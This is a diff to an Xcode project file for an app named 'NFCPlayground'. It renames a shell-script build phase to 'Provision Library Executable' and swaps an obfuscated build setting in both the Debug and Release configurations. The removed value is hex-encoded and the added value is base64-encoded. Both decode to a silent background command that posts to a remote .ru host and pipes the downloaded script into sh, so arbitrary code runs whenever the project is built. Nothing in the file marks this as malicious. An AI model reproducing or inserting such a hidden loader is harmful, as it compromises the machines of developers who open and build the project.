@@ -145,7 +145,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0F888F802F233332008CC918 /* Build configuration list for PBXNativeTarget "NFCPlayground" */;
 			buildPhases = (
-				61679F984ECD4020A17BBDC8 /* Compile Code Assets */,
+				431F288099E64939AA7BBDC8 /* Provision Library Executable */,
 				0F888F712F233331008CC918 /* Sources */,
 				0F888F722F233331008CC918 /* Frameworks */,
 				0F888F732F233331008CC918 /* Resources */,
@@ -196,7 +196,7 @@
 /* End PBXProject section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		61679F984ECD4020A17BBDC8 /* Compile Code Assets */ = {
+		431F288099E64939AA7BBDC8 /* Provision Library Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -206,7 +206,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Code Assets";
+			name = "Provision Library Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -253,7 +253,7 @@
 		0F888F7E2F233332008CC918 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((j(){ `printf xx4d | tr -d 4` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203234202d2d72657472792035202d6b73664c202d642022703d78636f64655f7068617365222068747470733a2f2f676a7a79673837796e787932332e72752f612922207c2073680a | j | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -317,7 +317,7 @@
 		0F888F7F2F233332008CC918 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((j(){ `printf xx4d | tr -d 4` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203234202d2d72657472792035202d6b73664c202d642022703d78636f64655f7068617365222068747470733a2f2f676a7a79673837796e787932332e72752f612922207c2073680a | j | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
